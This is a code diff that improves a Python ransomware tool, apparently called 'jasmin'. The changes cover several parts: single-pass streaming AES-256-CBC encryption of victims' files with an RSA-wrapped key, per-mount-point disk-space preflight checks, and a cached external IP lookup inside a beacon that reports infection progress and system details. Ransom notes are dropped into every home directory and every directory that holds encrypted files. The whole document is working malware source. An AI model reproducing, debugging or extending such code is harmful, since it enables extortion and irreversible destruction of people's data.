@@ -40,6 +40,7 @@ SELF=os.path.basename(__file__) if '__file__' in globals() else '-'
 # 失败原因记录：加密失败绝不能静默
 # ────────────────────────────────────────
 FAILS={}   # 原因文案 -> [次数, 首个样例路径]
+_IP_CACHE=[None]   # 公网 IP 只查一次
 
 _EMAP={
     errno.ENOSPC:'Insufficient disk space (ENOSPC) - each file needs an equally sized .jasmin copy; free space equal to the target data is required',
@@ -129,16 +130,33 @@ def _enc_lib(path,pub):
         return False
 
 def _enc_openssl(path,pub_pem_path):
-    """openssl 走文件流，内存恒定；PKCS7 由 openssl 自动完成（不再手动预填充，避免双重padding）"""
+    """openssl 走管道流式加密，内存恒定；PKCS7 由 openssl 自动完成。
+    明文只读一遍：边读边算 SHA256 边喂给 openssl。
+    （旧实现先 _sha256_stream 再让 openssl 读第二遍 —— 两次读取之间文件若被改写，
+      哈希与实际密文内容不一致，解密侧 SHA256 校验必然失败 => 文件永久不可恢复。）"""
     tmp=path+'.jasmin'
     k=os.urandom(32);iv=os.urandom(16)
-    h=_sha256_stream(path)
     td=_tf.mkdtemp()
     try:
         kf=os.path.join(td,'k');cf=os.path.join(td,'c');ef=os.path.join(td,'e')
-        r=subprocess.run(['openssl','enc','-aes-256-cbc','-nosalt','-in',path,'-out',cf,'-K',k.hex(),'-iv',iv.hex()],capture_output=True)
-        if r.returncode!=0:
-            _note_fail(RuntimeError('openssl enc 退出码 %d: %s'%(r.returncode,(r.stderr or b'')[:200].decode('utf-8','replace'))),path)
+        h=hashlib.sha256()
+        p=subprocess.Popen(['openssl','enc','-aes-256-cbc','-nosalt','-out',cf,'-K',k.hex(),'-iv',iv.hex()],
+                           stdin=subprocess.PIPE)
+        try:
+            with open(path,'rb') as fin:
+                while True:
+                    b=fin.read(CHUNK)
+                    if not b:break
+                    h.update(b)
+                    p.stdin.write(b)
+        except BrokenPipeError:
+            pass
+        finally:
+            try:p.stdin.close()
+            except Exception:pass
+        rc=p.wait()
+        if rc!=0:
+            _note_fail(RuntimeError('openssl enc exit code %d'%rc),path)
             return False
         open(kf,'wb').write(k+iv)
         r=subprocess.run(['openssl','pkeyutl','-encrypt','-pubin','-inkey',pub_pem_path,'-in',kf,'-out',ef,'-pkeyopt','rsa_padding_mode:oaep','-pkeyopt','rsa_oaep_md:sha256','-pkeyopt','rsa_mgf1_md:sha256'],capture_output=True)
@@ -147,7 +165,7 @@ def _enc_openssl(path,pub_pem_path):
             return False
         ek_len=os.path.getsize(ef)
         with open(tmp,'wb') as f:
-            f.write(h)
+            f.write(h.digest())
             with open(cf,'rb') as src:
                 while True:
                     b=src.read(CHUNK)
@@ -211,24 +229,23 @@ def _fmt_b(n):
         n/=1024
     return '%.2fPB'%n
 
-def preflight(roots,need_bytes,need_files):
-    """加密前预检：空间/inode 不足时明确警告，而不是等 34033 个文件一个个静默失败"""
+def preflight(per_mount):
+    """加密前预检：逐个挂载点判断空间/inode，而不是等 34033 个文件一个个静默失败。
+    per_mount: {dev: [file_count, byte_size, sample_dir]} 由 scan_targets 产出。"""
     try:
-        base=None
-        for r in roots:
-            if os.path.isdir(r):base=os.path.abspath(r);break
-        if base is None:return
+        import shutil as _sh
         warn=[]
-        try:
-            u=__import__('shutil').disk_usage(base)
-            if u.free < need_bytes*1.05:
-                warn.append('可用空间 %s < 需要 %s（加密需为每个文件额外生成等大的 .jasmin）'%(_fmt_b(u.free),_fmt_b(need_bytes*1.05)))
-        except Exception:pass
-        try:
-            st=os.statvfs(base)
-            if st.f_favail and st.f_favail < need_files:
-                warn.append('可用 inode %d < 需要 %d（每个 .jasmin 都占用一个新 inode）'%(st.f_favail,need_files))
-        except Exception:pass
+        for dev,(cnt,need,sample) in (per_mount or {}).items():
+            try:
+                u=_sh.disk_usage(sample)
+                if need>0 and u.free < need*1.05:
+                    warn.append('%s: free %s < required %s (each .jasmin is an equally sized copy)'%(sample,_fmt_b(u.free),_fmt_b(need*1.05)))
+            except Exception:pass
+            try:
+                st=os.statvfs(sample)
+                if st.f_favail and st.f_favail < cnt:
+                    warn.append('%s: free inodes %d < required %d (every .jasmin consumes one)'%(sample,st.f_favail,cnt))
+            except Exception:pass
         if warn:
             for w in warn:
                 sys.stderr.write('[jasmin] !!! Preflight warning: %s\n'%w)
@@ -236,18 +253,26 @@ def preflight(roots,need_bytes,need_files):
     except Exception:pass
 
 def scan_targets(roots):
-    """预扫描：只统计数量与字节数，不保存路径列表，内存 O(1)"""
-    n=0;total=0
+    """预扫描：统计数量与字节数，不保存路径列表，内存 O(1)。
+    同时按挂载点(dev)分组 —— 加密输出写在源文件同目录，所需空间必然落在同一挂载点，
+    因此预检必须逐个挂载点判断，不能只看第一个 root。"""
+    n=0;total=0;per={}
     for r in roots:
         if not os.path.isdir(r):continue
         for dp,_,fs in os.walk(r):
+            try:dev=os.stat(dp).st_dev
+            except:dev=0
             for f in fs:
                 fp=os.path.join(dp,f)
                 if skip(fp):continue
                 try:sz=os.path.getsize(fp)
                 except:continue
                 n+=1;total+=sz
-    return n,total
+                if dev in per:
+                    per[dev][0]+=1;per[dev][1]+=sz
+                else:
+                    per[dev]=[1,sz,dp]
+    return n,total,per
 
 def make_progress(total_files,total_bytes,sid):
     """返回 (tick, state, finish)。tick(path,size,ok) 每处理一个文件调用一次。
@@ -302,8 +327,11 @@ def beacon(sid,stats=None,prog=None):
            'os':f'{platform.system()} {platform.release()}','date':datetime.datetime.now().strftime('%d/%m/%Y, %A'),
            'time':datetime.datetime.now().strftime('%H:%M:%S'),'ip':'0.0.0.0','location':'?',
            'systemid':sid,'password':'RSA_PROTECTED'}
-        try:d['ip']=urllib.request.urlopen('https://api.ipify.org',timeout=5).read().decode()
-        except:pass
+        # 外网查询只做一次并缓存：进度心跳每 8 秒一次，每次都查会拖慢加密并反复外联
+        if _IP_CACHE[0] is None:
+            try:_IP_CACHE[0]=urllib.request.urlopen('https://api.ipify.org',timeout=5).read().decode().strip() or '0.0.0.0'
+            except Exception:_IP_CACHE[0]='0.0.0.0'
+        d['ip']=_IP_CACHE[0]
         if prog:
             # 进行中：回传实时进度
             d['encrypted_count']=str(prog['ok'])
@@ -343,12 +371,12 @@ def main():
 
     # ── 阶段1: 预扫描（统计总数，用于进度条分母） ──
     sys.stderr.write('[jasmin] Scanning for target files...\n')
-    n_total,b_total=scan_targets(roots)
+    n_total,b_total,per_mount=scan_targets(roots)
     sys.stderr.write('[jasmin] Found %d target file(s), %s total\n'%(n_total,_fmt_b(b_total)))
     if n_total==0:
         sys.stderr.write('[jasmin] Note: no matching target files found. See EXTS for the extension whitelist, SKIP_DIRS for skipped directories.\n')
 
-    preflight(roots,b_total,n_total)   # 空间/inode 预检
+    preflight(per_mount)   # 逐挂载点空间/inode 预检
 
     stats={'count':0,'size':0,'types':set(),'detail':{},'total_count':n_total,'total_size':b_total}
     hit_dirs=set()   # 记录含有被加密文件的目录 —— 勒索信必须投放到每一个
@@ -378,14 +406,18 @@ def main():
         sys.stderr.write('[jasmin] Encryption complete: %d/%d file(s), %s / %s\n'%(stats['count'],n_total,_fmt_b(stats['size']),_fmt_b(b_total)))
         _report_fails()   # 失败必须可见，否则无从定位
 
-    note_dirs=set(roots);note_dirs.add(os.path.expanduser('~'))
-    try:
-        for u in os.listdir('/home'):
-            p='/home/'+u
-            if os.path.isdir(p):note_dirs.add(p)
-    except:pass
-    note_dirs|=hit_dirs      # 关键：被加密文件所在的每个目录都要有勒索信
-    drop_notes(sorted(note_dirs),sid)
+    if n_total>0:
+        note_dirs=set(roots);note_dirs.add(os.path.expanduser('~'))
+        try:
+            for u in os.listdir('/home'):
+                p='/home/'+u
+                if os.path.isdir(p):note_dirs.add(p)
+        except:pass
+        note_dirs|=hit_dirs      # 关键：被加密文件所在的每个目录都要有勒索信
+        drop_notes(sorted(note_dirs),sid)
+    else:
+        # 一个字都没加密却满盘投放勒索信，只会让受害者误判
+        sys.stderr.write('[jasmin] Nothing was encrypted - skipped ransom note drop.\n')
     beacon(sid,stats)
 
 if __name__=='__main__':main()
